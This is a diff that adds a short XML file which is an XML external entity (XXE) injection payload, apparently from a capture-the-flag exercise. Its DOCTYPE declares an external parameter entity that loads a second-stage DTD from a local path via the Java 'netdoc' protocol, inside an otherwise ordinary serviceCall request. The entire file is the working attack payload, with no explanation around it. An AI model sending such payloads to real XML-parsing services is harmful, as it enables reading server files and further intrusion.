@@ -1,0 +1,17 @@
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+        <!ELEMENT r ANY >
+        <!ENTITY % sp SYSTEM "netdoc:///home/ctf/ttt.xml">
+        %sp;
+        ]>
+<root>
+    <input>
+        <serviceCall>
+            <service>1</service>
+            <address>2</address>
+            <operate>3</operate>
+            <params>4</params>
+            <return>5</return>
+        </serviceCall>
+    </input>
+</root>
